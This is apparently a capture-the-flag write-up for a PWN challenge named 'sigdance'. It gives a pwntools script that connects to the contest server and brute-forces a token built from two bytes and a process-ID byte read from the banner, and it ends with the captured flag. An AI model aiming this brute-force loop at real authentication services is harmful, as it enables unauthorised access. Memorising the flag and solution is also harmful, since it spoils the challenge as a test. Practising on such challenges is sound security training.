# _sigdance_

Category | Value
-- | --
PWN | 100

***

## Solver
```python
from pwn import *
import sys

HOST, PORT = "ctf.ac.upt.ro", 9053

while True:
    io = remote(HOST, PORT)
    banner = io.recvline()
    pid8 = int(banner.split(b"= ")[1])
    for A in range(256):
        for U in range(256):
            token = ((A << 16) ^ (U << 8) ^ pid8)
            io.sendline(f"{token}\n".encode())
            resp = io.recvline()
            if b"nope" not in resp.lower():
                print(f"A={A}, U={U}, token={token}")
                print("FLAG:", repr(resp.strip()))
                io.close()
                sys.exit(0)

```

## Proof-of-flag
```
CTF{cbc4e1be639219dad8912bb764b566200023e15152635eef87be047c41bd995a}
```